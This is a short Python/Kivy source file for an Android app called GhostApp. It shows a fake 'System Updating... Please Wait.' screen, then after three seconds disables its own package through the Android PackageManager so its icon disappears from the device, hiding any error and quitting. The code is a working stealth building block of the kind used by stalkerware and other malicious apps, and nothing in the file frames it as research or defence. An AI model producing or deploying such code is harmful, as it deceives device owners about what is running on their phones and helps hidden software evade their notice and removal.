import os
import time
import threading
from kivy.app import App
from kivy.uix.label import Label
from kivy.utils import platform

class GhostApp(App):
    def build(self):
        return Label(text="System Updating...\nPlease Wait.")

    def on_start(self):
        threading.Timer(3.0, self.hide_icon).start()

    def hide_icon(self):
        if platform == 'android':
            try:
                from jnius import autoclass
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                activity = PythonActivity.mActivity
                pm = activity.getPackageManager()
                pkg_name = activity.getPackageName()
                activity.getPackageManager().setApplicationEnabledSetting(
                    pkg_name, 
                    autoclass('android.content.pm.PackageManager').COMPONENT_ENABLED_STATE_DISABLED, 
                    0
                )
            except Exception:
                pass
        App.get_running_app().stop()

if __name__ == '__main__':
    GhostApp().run()
